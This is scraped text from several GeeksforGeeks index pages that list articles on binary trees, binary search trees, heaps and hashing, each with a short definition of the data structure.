Find LCA in Binary Tree using RMQ Maximum difference between node and its ancestor in Binary Tree Print the path common to the two paths from the root to the two given nodes Query for ancestor-descendant relationship in a tree Iterative method to find ancestors of a given binary tree Print Ancestors of a given node in Binary Tree Kth ancestor of a node in binary tree More >> Misc : Succinct Encoding of Binary Tree Binary Indexed Tree : Range Updates and Point Queries The Great Tree-List Recursion Problem Custom Tree Problem Tree Isomorphism Problem Ways to color a skewed tree such that parent and child have different colors Write a program to Delete a Tree Delete leaf nodes with value as x Non-recursive program to delete an entire binary tree Write a program to Calculate Size of a tree Iterative program to Calculate Size of a tree Write a Program to Find the Maximum Depth or Height of a Tree Iterative Method to find Height of Binary Tree Height of a complete binary tree (or Heap) with N nodes Height of binary tree considering even level leaves only Find Height of Binary Tree represented by Parent array How to determine if a binary tree is height-balanced? Find height of a special binary tree whose leaf nodes are connected Height of a generic tree from parent array Diameter of a Binary Tree Diameter of a Binary Tree in O(n) [A new method] Possible edges of a tree for given diameter, height and vertices Deepest right leaf node in a binary tree | Iterative approach Sink Odd nodes in Binary Tree Depth of the deepest odd level node in Binary Tree Find depth of the deepest odd level leaf node Find the Deepest Node in a Binary Tree Deepest left leaf node in a binary tree | iterative approach Deepest left leaf node in a binary tree Find Minimum Depth of a Binary Tree Replace node with depth in a binary tree Maximum width of a binary tree Vertical width of Binary tree | Set 1 Vertical width of Binary tree | Set 2 Find if given vertical level of binary tree is sorted or not Check if a binary tree is sorted level-wise or not Bottom View of a Binary Tree Program to count leaf nodes in a binary tree Iterative program to count leaf nodes in a Binary Tree Count Non-Leaf nodes in a Binary Tree Count half nodes in a Binary tree (Iterative and Recursive) Count full nodes in a Binary tree (Iterative and Recursive) Connect Nodes at same Level (Level Order Traversal) Connect nodes at same level using constant extra space Connect nodes at same level Level with maximum number of nodes Averages of Levels in Binary Tree Largest value in each level of Binary Tree Smallest value in each level of Binary Tree Get Level of a node in a Binary Tree Get level of a node in binary tree | iterative approach Find mirror of a given node in Binary tree Find largest subtree having identical left and right subtrees Find Count of Single Valued Subtrees Closest leaf to a given node in Binary Tree Find the closest leaf in a Binary Tree Iterative Search for a key ‘x’ in Binary Tree Given a binary tree, how do you remove all the half nodes? Swap Nodes in Binary tree of every k’th level Pairwise Swap leaf nodes in a binary tree Root to leaf paths having equal lengths in a Binary Tree Root to leaf path with maximum distinct nodes Maximum Consecutive Increasing Path Length in Binary Tree Longest Path with Same Values in a Binary Tree Remove nodes on root to leaf paths of length < K Longest consecutive sequence in Binary tree Path length having maximum number of bends Number of turns to reach from one node to other in binary tree Create loops of even and odd values in a binary tree Find first non matching leaves in two binary trees Get maximum left node in binary tree Find a number in minimum steps Factor Tree of a given Number Number of full binary trees such that each node is product of its children Number of subtrees having odd count of even numbers Find distance from root to given node in a binary tree Find distance between two given keys of a Binary Tree Find right sibling of a binary tree with parent pointers Find next right node of a given key Tilt of Binary Tree Find All Duplicate Subtrees Top three elements in binary tree Find maximum (or minimum) in Binary Tree Extract Leaves of a Binary Tree in a Doubly Linked List Minimum no. of iterations to pass information to all nodes in the tree Quick Links : ‘Practice Problems’ on Trees ‘Quizzes’ on Binary Trees ‘Videos’ on Trees If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Binary Search Tree - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Binary Search Tree Recent Articles on Binary Search Tree ! Binary Search Tree is a node-based binary tree data structure which has the following properties: The left subtree of a node contains only nodes with keys lesser than the node’s key. The right subtree of a node contains only nodes with keys greater than the node’s key. The left and right subtree each must also be a binary search tree. Topic : Basic Construction and Conversion Check and Smallest/Largest Element Red Black Tree and Threaded Binary Tree Misc Quick Links Basic : Binary Search Tree | Set 1 (Search and Insertion) Binary Search Tree | Set 2 (Delete) Advantages of BST over Hash Table Construction and Conversion : Construct BST from given preorder traversal | Set 1 Construct BST from given preorder traversal | Set 2 Binary Tree to Binary Search Tree Conversion Sorted Linked List to Balanced BST Sorted Array to Balanced BST Transform a BST to greater sum tree Construct all possible BSTs for keys 1 to N Convert a BST to a Binary Tree such that sum of all greater keys is added to every key BST to a Tree with sum of all smaller keys In-place Convert BST into a Min-Heap Convert BST to Min Heap Construct BST from its given level order traversal Reverse a path in BST using queue Binary Tree to Binary Search Tree Conversion using STL set Check given array of size n can represent BST of n levels or not Convert a normal BST to Balanced BST Merge Two Balanced Binary Search Trees Merge two BSTs with limited extra space Checking and Searching : Find the node with minimum value in a Binary Search Tree Check if the given array can represent Level Order Traversal of Binary Search Tree Check if a given array can represent Preorder Traversal of Binary Search Tree Lowest Common Ancestor in a Binary Search Tree A program to check if a binary tree is BST or not Find k-th smallest element in BST (Order Statistics in BST) Check if each internal node of a BST has exactly one child Check for Identical BSTs without building the trees K’th Largest Element in BST when modification to BST is not allowed K’th Largest element in BST using constant extra space Second largest element in BST K’th smallest element in BST using O(1) Extra Space Check if given sorted sub-sequence exists in binary search tree Simple Recursive solution to check whether BST contains dead end Check if an array represents Inorder of Binary Search tree or not Check if two BSTs contain same set of elements Largest number in BST which is less than or equal to N Maximum Unique Element in every subarray of size K Iterative searching in Binary Search Tree Find distance between two nodes of a Binary Search Tree Count pairs from two BSTs whose sum is equal to a given value x Find median of BST in O(n) time and O(1) space Largest BST in a Binary Tree | Set 2 Remove BST keys outside the given range Print BST keys in the given range Print BST keys in given Range | O(1) Space Count BST nodes that lie in a given range Count BST subtrees that lie in given range Remove all leaf nodes from the binary search tree Sum of k smallest elements in BST Inorder Successor in Binary Search Tree Inorder predecessor and successor for a given key in BST Inorder predecessor and successor for a given key in BST | Iterative Approach Find if there is a triplet in a Balanced BST that adds to zero Find a pair with given sum in a Balanced BST Find a pair with given sum in BST Maximum element between two nodes of BST Find pairs with given sum such that pair elements lie in different BSTs Find the closest element in Binary Search Tree Find the largest BST subtree in a given Binary Tree Replace every element with the least greater element on its right Add all greater values to every node in a given BST Red Black Tree and Threaded Binary Tree : C Program for Red Black Tree Insertion Left Leaning Red Black Tree (Insertion) Threaded Binary Tree Threaded Binary Tree | Insertion Threaded Binary Search Tree | Deletion Convert a Binary Tree to Threaded binary tree | Set 1 (Using Queue) Convert a Binary Tree to Threaded binary tree | Set 2 (Efficient) Inorder Non-threaded Binary Tree Traversal without Recursion or Stack Misc : Sorted order printing of a given array that represents a BST Two nodes of a BST are swapped, correct the BST Floor and Ceil from a BST Given n appointments, find all conflicting appointments How to handle duplicates in Binary Search Tree? Data Structure for a single resource reservations How to implement decrease key or change key in Binary Search Tree? Print Common Nodes in Two Binary Search Trees Count inversions in an array | Set 2 (Using Self-Balancing BST) Leaf nodes from Preorder of a Binary Search Tree Leaf nodes from Preorder of a Binary Search Tree (Using Recursion) Binary Search Tree insert with Parent Pointer Minimum Possible value of |ai + aj – k| for given array and k. Rank of an element in a stream Special two digit numbers in a Binary Search Tree Quick Links : ‘Practice Problems’ on Binary Search Tree ‘Quizzes’ on Binary Search Tree ‘Quizzes’ on Balanced Binary Search Trees Videos My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Heap Data Structure - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Heap Data Structure Recent articles on Heap ! A Heap is a special Tree-based data structure in which the tree is a complete binary tree. Generally, Heaps can be of two types: Max-Heap: In a Max-Heap the key present at the root node must be greatest among the keys present at all of it’s children. The same property must be recursively true for all sub-trees in that Binary Tree. Min-Heap: In a Min-Heap the key present at the root node must be minimum among the keys present at all of it’s children. The same property must be recursively true for all sub-trees in that Binary Tree. Popular Articles on Heap : Binary Heap Time Complexity of building a heap Applications of Heap Data Structure Binomial Heap Fibonacci Heap Leftist Heap K-ary Heap Heap Sort Iterative Heap Sort K’th Largest Element in an array K’th Smallest/Largest Element in Unsorted Array | Set 1 Sort an almost sorted array/ Tournament Tree (Winner Tree) and Binary Heap Check if a given Binary Tree is Heap How to check if a given array represents a Binary Heap? Connect n ropes with minimum cost Design an efficient data structure for given operations Merge k sorted arrays | Set 1 Merge Sort Tree for Range Order Statistics Sort numbers stored on different machines Smallest Derangement of Sequence Largest Derangement of a Sequence K maximum sum combinations from two arrays Maximum distinct elements after removing k elements Maximum difference between two subsets of m elements Height of a complete binary tree (or Heap) with N nodes Heap Sort for decreasing order using min heap Print all nodes less than a value x in a Min Heap. Median of Stream of Running Integers using STL Largest triplet product in a stream Find k numbers with most occurrences in the given array Convert BST to Min Heap Merge two binary Max Heaps K-th Largest Sum Contiguous Subarray Minimum product of k integers in an array of positive Integers Leaf starting point in a Binary Heap data structure Why is Binary Heap Preferred over BST for Priority Queue? Convert min Heap to max Heap Given level order traversal of a Binary Tree, check if the Tree is a Min-Heap Rearrange characters in a string such that no two adjacent are same Implementation of Binomial Heap Array Representation Of Binary Heap Sum of all elements between k1’th and k2’th smallest elements Minimum sum of two numbers formed from digits of an array K’th largest element in a stream k largest(or smallest) elements in an array | added Min Heap method Median in a stream of integers (running integers) Sort a nearly sorted (or K sorted) array Misc : Why is Binary Heap Preferred over BST for Priority Queue? Heap in C++ STL | make_heap(), push_heap(), pop_heap(), sort_heap(), is_heap, is_heap_until() Heap in Python (Using Heapq module) Where is Heap Sort used practically? Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Hashing Data Structure - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Hashing Data Structure Hashing is an important Data Structure which is designed to use a special function called the Hash function which is used to map a given value with a particular key for faster access of elements. The efficiency of mapping depends of the efficiency of the hash function used. Let a hash function H(x) maps the value at the index x%10 in an Array. For example if the list of values is [11,12,13,14,15] it will be stored at positions {1,2,3,4,5} in the array or Hash table respectively. Recent Articles on Hashing Topic : Basics Easy Intermediate Hard Misc Quick Links Basics : Introduction Index Mapping (or Trivial Hashing) Separate Chaining for Collision Handling Open Addressing for Collision Handling Double Hashing Load Factor and Rehashing Easy : Print a Binary Tree in Vertical Order | Set 2 (Hashmap based Method) Find whether an array is subset of another array Union and Intersection of two linked lists Given an array A[] and a number x, check for pair in A[] with sum as x Minimum delete operations to make all elements of array same Minimum operation to make all elements equal in array Maximum distance between two occurrences of same element in array Count maximum points on same line Check if a given array contains duplicate elements within k distance from each other Find duplicates in a given array when elements are not limited to a range Find top k (or most frequent) numbers in a stream Most frequent element in an array Smallest subarray with all occurrences of a most frequent element First element occurring k times in an array Given an array of pairs, find all symmetric pairs in it Find the only repetitive element between 1 to n-1 Find any one of the multiple repeating elements in read only array Find top three repeated in array Group multiple occurrence of array elements ordered by first occurrence How to check if two given sets are disjoint? Non-overlapping sum of two sets Find elements which are present in first array and not in second Check if two arrays are equal or not Pair with given sum and maximum shortest distance from end Pair with given product | Set 1 (Find if any pair exists) Find missing elements of a range k-th missing element in increasing sequence which is not present in a given sequence Find pair with greatest product in array Minimum number of subsets with distinct elements Remove minimum number of elements such that no common element exist in both arra Count items common to both the lists but with different prices Minimum Index Sum for Common Elements of Two Lists Find pairs with given sum such that elements of pair are in different rows Common elements in all rows of a given matrix Find distinct elements common to all rows of a matrix Find all permuted rows of a given row in a matrix Change the array into a permutation of numbers from 1 to n Count pairs with given sum Count pairs from two sorted arrays whose sum is equal to a given value x Count pairs from two linked lists whose sum is equal to a given value Count quadruples from four sorted arrays whose sum is equal to a given value x Number of subarrays having sum exactly equal to k Count pairs whose products exist in array Given two unsorted arrays, find all pairs whose sum is x Frequency of each element in an unsorted array Sort elements by frequency Find pairs in array whose sums already exist in array Find all pairs (a, b) in an array such that a % b = k Convert an array to reduced form | Set 1 (Simple and Hashing) Return maximum occurring character in an input string Group words with same set of characters Second most repeated word in a sequence Smallest element repeated exactly ‘k’ times (not limited to small range) Numbers with prime frequencies greater than or equal to k Find k numbers with most occurrences in the given array Find the first repeating element in an array of integers Find sum of non-repeating (distinct) elements in an array Non-Repeating Element k-th distinct (or non-repeating) element in an array. Print All Distinct Elements of a given integer array Only integer with positive value in positive negative value in array Pairs of Positive Negative values in an array Intermediate : Find Itinerary from a given list of tickets Find number of Employees Under every Employee Count divisible pairs in an array Check if an array can be divided into pairs whose sum is divisible by k Longest subarray with sum divisible by k Subarray with no pair sum divisible by K Print array elements that are divisible by at-least one other Find three element from different three arrays such that that a + b + c = sum Find four elements a, b, c and d in an array such that a+b = c+d Find the largest subarray with 0 sum Printing longest Increasing consecutive subsequence Longest Increasing consecutive subsequence Longest subsequence such that difference between adjacents is one | Set 2 Longest Consecutive Subsequence Largest increasing subsequence of consecutive integers Count subsets having distinct even numbers Count distinct elements in every window of size k Maximum possible sum of a window in an array such that elements of same window in other array are unique Distributing items when a person cannot take more than two items of same type Design a data structure that supports insert, delete, search and getRandom in constant time Check if array contains contiguous integers with duplicates allowed Length of the largest subarray with contiguous elements Find if there is a subarray with 0 sum Print all subarrays with 0 sum Find subarray with given sum | Set 2 (Handles Negative Numbers) Find four elements that sum to a given value Implementing our Own Hash Table with Separate Chaining in Java Implementing own Hash Table with Open Addressing Linear Probing in C++ Vertical Sum in a given Binary Tree Group Shifted String Minimum insertions to form a palindrome with permutations allowed Check for Palindrome after every character replacement Query Maximum length subsequence with difference between adjacent elements as either 0 or 1 | Set 2 Maximum difference between frequency of two elements such that element having greater frequency is also greater Difference between highest and least frequencies in an array Maximum difference between first and last indexes of an element in array Maximum possible difference of two subsets of an array Sorting using trivial hash function Smallest subarray with k distinct numbers Longest subarray not having more then K distinct elements Sum of f(a[i], a[j]) over all pairs in an array of n integers Find number of pairs in an array such that their XOR is 0 Maximize elements using another array Hard : Clone a Binary Tree with Random Pointers Largest subarray with equal number of 0s and 1s Longest subarray having count of 1s one more than count of 0s Longest subarray having count of 1s one more than count of 0s Count Substrings with equal number of 0s, 1s and 2s Print all triplets in sorted array that form AP All unique triplets that sum up to a given value Find all triplets with zero sum Count number of triplets with product equal to given number Count of index pairs with equal elements in an array Palindrome Substring Queries Find smallest range containing elements from k lists Range Queries for Frequencies of array elements Elements to be added so that all elements of a range are present in array Cuckoo Hashing – Worst case O(1) Lookup! Subarrays with distinct elements Count subarrays having total distinct elements same as original array Count subarrays with same even and odd elements Minimum number of distinct elements after removing m items Distributing items when a person cannot take more than two items of same type Maximum consecutive numbers present in an array Maximum array from two given arrays keeping order same Maximum number of chocolates to be distributed equally among k students Find largest d in array such that a + b + c = d Find Sum of all unique sub-array sum for a given array. Misc : Advantages of BST over Hash Table Internal Working of HashMap in Java Hash Table vs STL Map Recaman’s sequence C++ program for hashing with chaining Largest subset whose all elements are Fibonacci numbers Pairs of Amicable Numbers Find All Duplicate Subtrees Hash Table vs STL Map Find if there is a rectangle in binary matrix with corners as 1 Maximum area rectangle by picking four sides from array 